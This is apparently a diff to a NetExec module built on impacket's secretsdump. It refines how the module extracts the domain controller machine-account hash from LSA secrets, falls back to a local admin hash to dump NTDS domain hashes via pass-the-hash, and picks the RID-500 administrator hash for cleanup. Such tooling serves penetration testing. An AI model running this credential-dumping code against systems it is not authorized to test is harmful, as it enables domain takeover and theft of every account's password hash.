@@ -1,4 +1,5 @@
 import contextlib
+import re
 
 from impacket.examples.secretsdump import SAMHashes, LSASecrets, LocalOperations
 from impacket.smbconnection import SessionError
@@ -72,13 +73,16 @@ class NXCModule:
 
             def parse_lsa(secret_type, secret):
                 context.log.highlight(secret)
+                if self.machine_account:
+                    return
                 for line in secret.splitlines():
-                    if "aad3b" in line.lower() and len(line.split(":")) >= 3:
-                        fields = line.split(":")
-                        account_name = fields[0].split("\\")[-1] if "\\" in fields[0] else fields[0]
-                        if account_name.endswith("$"):
-                            self.machine_account = account_name
-                            self.machine_account_hash = fields[2]
+                    match = re.search(r"aad3b435b51404eeaad3b435b51404ee:([0-9a-f]{32})", line, re.IGNORECASE)
+                    if match:
+                        self.machine_account_hash = match.group(1)
+                        account_name = line.split(":", 1)[0].strip().split("\\")[-1]
+                        # "$MACHINE.ACC" has no real name -> derive it from the connection.
+                        self.machine_account = account_name if account_name.endswith("$") else f"{connection.hostname}$"
+                        return
 
             local_operations = LocalOperations(log_path + "SYSTEM")
             boot_key = local_operations.getBootKey()
@@ -92,12 +96,16 @@ class NXCModule:
         except Exception as e:
             context.log.fail(f"Fail to dump the sam and lsa: {e!s}")
 
-        # Attempt NTDS dump with DC Machine Account
-        if self._try_dump_ntds(connection, context, self.machine_account, self.machine_account_hash):
+        dump_creds = None
+        for username, user_hash in [(self.machine_account, self.machine_account_hash), (self.local_admin, self.local_admin_hash)]:
+            if self._try_dump_ntds(connection, context, username, user_hash):
+                dump_creds = (username, user_hash)
+                break
+
+        if dump_creds:
             self.cleanup_user, self.cleanup_hash = self._extract_da_hash(connection.output_filename, context)
             if not self.cleanup_user or not self.cleanup_hash:
-                self.cleanup_user = self.machine_account
-                self.cleanup_hash = self.machine_account_hash
+                self.cleanup_user, self.cleanup_hash = dump_creds
 
             self._perform_cleanup(connection, context, self.cleanup_user, self.cleanup_hash, rand_suffix)
         else:
@@ -105,6 +113,8 @@ class NXCModule:
             self._print_cleanup_warning(context, rand_suffix)
 
     def _try_dump_ntds(self, connection, context, username, user_hash):
+        if not username or not user_hash:
+            return False
         with contextlib.suppress(Exception):
             connection.conn.logoff()
         connection.create_conn_obj()
@@ -118,6 +128,9 @@ class NXCModule:
         return False
 
     def _perform_cleanup(self, connection, context, username, user_hash, rand_suffix):
+        if not username or not user_hash:
+            self._print_cleanup_warning(context, rand_suffix)
+            return
         context.log.display(f"Using {username} to clean up files...")
         with contextlib.suppress(Exception):
             connection.conn.logoff()
@@ -164,12 +177,18 @@ class NXCModule:
     def _extract_da_hash(self, output_filename, context):
         try:
             with open(f"{output_filename}.ntds") as f:
-                first_line = f.readline().strip()
-                if first_line:
-                    fields = first_line.split(":")
-                    if len(fields) >= 4:
-                        da_user = fields[0].split("\\")[-1] if "\\" in fields[0] else fields[0]
+                fallback = None
+                for line in f:
+                    fields = line.strip().split(":")
+                    if len(fields) < 4 or not fields[3]:
+                        continue
+                    da_user = fields[0].split("\\")[-1] if "\\" in fields[0] else fields[0]
+                    if fields[1] == "500":
                         return da_user, fields[3]
+                    if fallback is None:
+                        fallback = (da_user, fields[3])
+                if fallback:
+                    return fallback
         except Exception as e:
             context.log.debug(f"Failed to read NTDS file for cleanup: {e}")
         return None, None
